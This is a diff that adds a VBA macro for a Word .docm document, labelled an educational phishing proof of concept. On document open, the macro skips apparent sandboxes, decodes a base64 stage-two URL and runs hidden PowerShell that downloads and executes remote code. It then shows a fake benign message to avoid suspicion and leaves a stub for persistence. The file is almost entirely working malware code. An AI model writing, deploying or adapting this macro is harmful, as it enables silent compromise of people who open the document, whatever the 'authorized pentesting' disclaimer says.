@@ -1,1 +1,70 @@
-oh
+Attribute VB_Name = "PhishingHook"
+' Educational PoC: Stage 1 Phishing Macro for Word .docm
+' Triggers on Document_Open, downloads stage2.ps1 from C2, executes via PS.
+' Obfuscation: Base64 + random vars. Evasion: Basic sandbox check.
+' WARNING: For authorized pentesting only!
+
+Private Sub Document_Open()
+    ' Anti-analysis: Check if running in VM/sandbox (crude)
+    Dim userName As String
+    userName = Environ("USERNAME")
+    If InStr(userName, "sandbox") > 0 Or InStr(userName, "vm") > 0 Then Exit Sub
+    
+    ' Obfuscated payload URL (replace with your C2: http://example.com/stage2.ps1)
+    Dim payloadUrl As String
+    payloadUrl = "aHR0cDovL2V4YW1wbGUuY29tL3N0YWdlMi5wczE="  ' Base64: http://example.com/stage2.ps1
+    
+    ' Decode URL
+    Dim decodedUrl As String
+    decodedUrl = DecodeBase64(payloadUrl)
+    
+    ' PowerShell command: Download & execute
+    Dim psCommand As String
+    psCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('" & decodedUrl & "')"""
+    
+    ' Execute via WScript.Shell
+    Dim shell As Object
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run psCommand, 0, False  ' Hidden window, no wait
+    
+    ' Cleanup: Optional - delete temp files or self-destruct
+    Kill Environ("TEMP") & "\temp_hook.vbs"  ' If you drop one
+    
+    MsgBox "Document loaded successfully! (Fake benign message to avoid suspicion)", vbInformation
+End Sub
+
+' Helper: Base64 Decode (simple implementation)
+Private Function DecodeBase64(input As String) As String
+    Dim i As Integer, j As Integer
+    Dim output As String, temp As String
+    Dim a As Integer, b As Integer, c As Integer, d As Integer
+    Dim bytes(0 To 3) As Integer
+    
+    For i = 1 To Len(input) Step 4
+        temp = Mid(input, i, 4)
+        For j = 1 To 4
+            Select Case Mid(temp, j, 1)
+                Case "A" To "Z": bytes(j - 1) = Asc(Mid(temp, j, 1)) - 65
+                Case "a" To "z": bytes(j - 1) = Asc(Mid(temp, j, 1)) - 71
+                Case "0" To "9": bytes(j - 1) = Asc(Mid(temp, j, 1)) + 4
+                Case "+": bytes(j - 1) = 62
+                Case "/": bytes(j - 1) = 63
+                Case "=": bytes(j - 1) = 0
+            End Select
+        Next j
+        
+        ' Convert 4 bytes to 3 chars
+        a = (bytes(0) * 4) + (bytes(1) \ 16)
+        b = ((bytes(1) And 15) * 16) + (bytes(2) \ 4)
+        c = ((bytes(2) And 3) * 64) + bytes(3)
+        
+        output = output & Chr(a) & Chr(b) & Chr(c)
+    Next i
+    
+    DecodeBase64 = output
+End Function
+
+' Optional: AutoClose to chain or persist
+Private Sub Document_Close()
+    ' Could add persistence here, e.g., copy to Startup folder
+End Sub
